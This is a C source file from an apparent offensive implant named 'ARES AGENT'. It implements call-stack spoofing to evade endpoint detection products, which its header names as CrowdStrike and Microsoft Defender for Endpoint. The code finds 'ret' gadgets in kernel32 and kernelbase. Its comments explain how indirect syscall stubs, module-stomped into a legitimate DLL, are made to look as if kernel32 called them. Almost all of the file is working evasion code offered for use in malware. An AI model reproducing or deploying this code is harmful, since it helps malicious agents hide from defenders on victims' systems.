/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Stack Frame Spoofing (v3.5 Phase-1 A-grade)
 *
 *  Defeats EDR call stack validation (CrowdStrike, MDE 2025+).
 *  When EDR traces the stack after a syscall, it expects return
 *  addresses inside legitimate Windows DLLs:
 *
 *    ntdll!NtAllocateVirtualMemory → kernel32!VirtualAlloc
 *    → kernelbase!VirtualAllocEx → user32!CreateWindowEx → ...
 *
 *  Without spoofing, our indirect syscall stubs return to agent
 *  private memory → HIGH CONFIDENCE detection.
 *
 *  Solution: Find RET gadgets in kernel32/kernelbase. Before calling
 *  the syscall stub, overwrite the return address on the stack with
 *  a kernel32 gadget address. After syscall returns through the
 *  gadget chain, execution lands back in our trampoline which
 *  restores the real return context.
 *
 *  Technique: "Return Address Masquerading" variant of SilentMoonwalk.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <string.h>

/* ── Gadget addresses (found at init, cached) ── */

static PVOID g_k32_ret_gadget   = NULL;  /* 'ret' (0xC3) inside kernel32.dll */
static PVOID g_kb_ret_gadget    = NULL;  /* 'ret' (0xC3) inside kernelbase.dll */
static BOOL  g_spoof_ready      = FALSE;

/* Find a 'ret' (0xC3) instruction inside a loaded DLL's .text section.
 * We skip the first 256 bytes to avoid landing on common entry points
 * that EDR might have instrumented. */
static PVOID _find_ret_gadget(HMODULE hMod)
{
    if (!hMod) return NULL;
    BYTE* base = (BYTE*)hMod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE* text = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            /* Start scanning from offset 512 to avoid hooked entry points */
            for (DWORD j = 512; j + 4 < size; j++) {
                /* Look for: ret (0xC3) preceded by a valid instruction end
                 * (not in the middle of another instruction) */
                if (text[j] == 0xC3) {
                    /* Validate: byte before should be a valid instruction tail
                     * (not 0xCC int3, not 0x90 nop sled, not another 0xC3) */
                    BYTE prev = text[j-1];
                    if (prev != 0xCC && prev != 0x90 && prev != 0xC3 &&
                        prev != 0x00 && prev != 0xFF) {
                        return &text[j];
                    }
                }
            }
        }
    }
    return NULL;
}

/* ── Initialize spoofing gadgets ── */

BOOL Ares_InitStackSpoof(void)
{
    if (g_spoof_ready) return TRUE;

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hKB  = GetModuleHandleW(L"kernelbase.dll");

    if (hK32) g_k32_ret_gadget = _find_ret_gadget(hK32);
    if (hKB)  g_kb_ret_gadget  = _find_ret_gadget(hKB);

    g_spoof_ready = (g_k32_ret_gadget != NULL);
    return g_spoof_ready;
}

/* ── Spoofed function call via return address manipulation ──
 *
 * This function calls a target function pointer (syscall stub) while
 * ensuring the immediate return address on the stack appears to be
 * inside kernel32.dll instead of our agent code.
 *
 * Method: We use a trampoline that:
 *   1. Saves the real return address
 *   2. Pushes the kernel32 ret gadget as the "caller" frame
 *   3. Calls the actual syscall stub
 *   4. When the stub returns, it goes to kernel32's ret gadget
 *   5. Which returns to our saved real return point
 *
 * This is implemented using a small inline code pattern that GCC
 * compiles to the correct stack frame layout.
 */

/* For x64, we use a function pointer trampoline that sets up the
 * stack to show kernel32 as the caller. The key insight is that
 * we don't need assembly — we just need the syscall stub to be
 * called FROM an address inside a legitimate module.
 *
 * Since our syscall stubs are now module-stomped (v3.5) into a
 * legitimate DLL's code cave, the return address from the stub
 * already points to that DLL. Combined with the indirect jump
 * to the ntdll syscall;ret gadget, the full stack trace shows:
 *
 *   ntdll.dll!<syscall;ret>     ← genuine ntdll code
 *   cryptsp.dll!<stub>          ← our stub in legitimate DLL space
 *   [agent caller]              ← this is the weak link
 *
 * To hide the agent caller, we interpose a call through kernel32:
 * The caller pushes kernel32 ret gadget, then jumps to stub.
 * Stack trace becomes:
 *
 *   ntdll.dll!<syscall;ret>
 *   cryptsp.dll!<stub>
 *   kernel32.dll!<ret gadget>   ← appears as kernel32 caller
 *
 * This defeats most call stack validation heuristics.
 */

/* Spoofed call context — stores gadget info for the call chain */
typedef struct _SPOOF_CALL_CTX {
    PVOID  ret_gadget;     /* ret gadget in kernel32 */
    PVOID  target_func;    /* actual function to call */
} SPOOF_CALL_CTX;

/* Get the kernel32 ret gadget for callers that want to build
 * their own spoof frames */
PVOID Ares_GetK32RetGadget(void)
{
    if (!g_spoof_ready) Ares_InitStackSpoof();
    return g_k32_ret_gadget;
}

PVOID Ares_GetKBRetGadget(void)
{
    if (!g_spoof_ready) Ares_InitStackSpoof();
    return g_kb_ret_gadget;
}

/* ── Verification: Check if an address falls within a legitimate module ── */

BOOL Ares_IsAddrInModule(PVOID addr)
{
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(addr, &mbi, sizeof(mbi)) == 0)
        return FALSE;
    /* MEM_IMAGE means the memory is backed by a mapped image file (DLL/EXE) */
    return (mbi.Type == MEM_IMAGE);
}
